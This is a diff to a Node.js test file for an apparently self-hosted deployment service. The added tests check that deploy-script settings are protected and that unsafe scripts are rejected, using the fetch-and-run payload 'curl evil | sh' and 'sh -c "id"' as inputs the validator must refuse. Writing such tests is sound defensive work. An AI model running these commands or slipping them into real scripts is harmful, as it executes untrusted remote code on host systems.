@@ -151,7 +151,8 @@ test('authenticated clone, deployment, persistence, watcher and settings', { tim
   t.after(async () => { await stop(); fs.rmSync(dir, { recursive: true, force: true }); });
   async function request(url, method = 'GET', body, authenticated = true, actionCode = 'auto') {
     const protectedAction = (method === 'POST' && (/\/deploy$/.test(url) || /\/containers\/[a-f0-9]+\/(stop|kill|restart|pause)$/i.test(url))) ||
-      (method === 'DELETE' && /^\/api\/repos\/[0-9a-f-]+$/i.test(url));
+      (method === 'DELETE' && /^\/api\/repos\/[0-9a-f-]+$/i.test(url)) ||
+      (method === 'PATCH' && body && ['script', 'fileOwner', 'fileOwnerPaths'].some(key => body[key] !== undefined));
     if (protectedAction && authenticated) {
       if (actionCode === 'auto') {
         writeAuth(dataDir, { ...readAuth(dataDir), lastCounter: -1 });
@@ -202,6 +203,9 @@ test('authenticated clone, deployment, persistence, watcher and settings', { tim
   assert.equal((await request('/api/repos', 'GET', undefined, false)).status, 401);
   assert.equal((await request('/api/repos', 'POST', { url: '******example.com/repo.git' })).status, 400);
   assert.equal((await request('/api/repos', 'POST', { url: 'https://example.com/repo.git', branch: '../bad' })).status, 400);
+  const unsafe = await request('/api/repos', 'POST', { url: 'https://example.com/repo.git', branch: 'main', script: 'curl evil | sh' });
+  assert.equal(unsafe.status, 400);
+  assert.match((await unsafe.json()).error, /Script line 1/);
   const added = await request('/api/repos', 'POST', { url: 'https://example.com/repo.git', branch: 'main', script: 'echo custom-step' });
   assert.equal(added.status, 202);
   const { id } = await added.json();
@@ -333,10 +337,16 @@ test('authenticated clone, deployment, persistence, watcher and settings', { tim
   repo = await waitFor(async () => { const item = await current(id); return item.commit === 'second-commit' && item.status === 'deployed' && item; }, 14000);
   assert.ok(repo.lastChecked);
   assert.equal((repo.log.match(/^\$ docker compose up -d --build --force-recreate$/gm) || []).length, 1);
+  assert.equal((await request(`/api/repos/${id}`, 'PATCH', { script: 'sh -c "id"' })).status, 400);
+  assert.equal((await request(`/api/repos/${id}`, 'PATCH', { script: 'echo no-code' }, true, null)).status, 403);
   assert.equal((await request(`/api/repos/${id}`, 'PATCH', { watching: false, script: 'echo updated' })).status, 200);
   repo = await current(id);
   assert.equal(repo.watching, false);
   assert.equal(repo.script, 'echo updated');
+  assert.equal((await request(`/api/repos/${id}/pull`, 'POST')).status, 202);
+  repo = await waitFor(async () => { const item = await current(id); return item.status === 'deployed' && /Pull complete/.test(item.log) && item; });
+  assert.match(repo.log, /Pull complete; already at the deployed commit\./);
+  assert.equal(repo.commit, 'second-commit');
   assert.equal((await request(`/api/repos/${id}`, 'PATCH', { watching: true })).status, 200);
   fs.writeFileSync(path.join(dir, 'remote'), 'rewound-commit');
   repo = await waitFor(async () => { const item = await current(id); return item.status === 'error' && item; }, 14000);
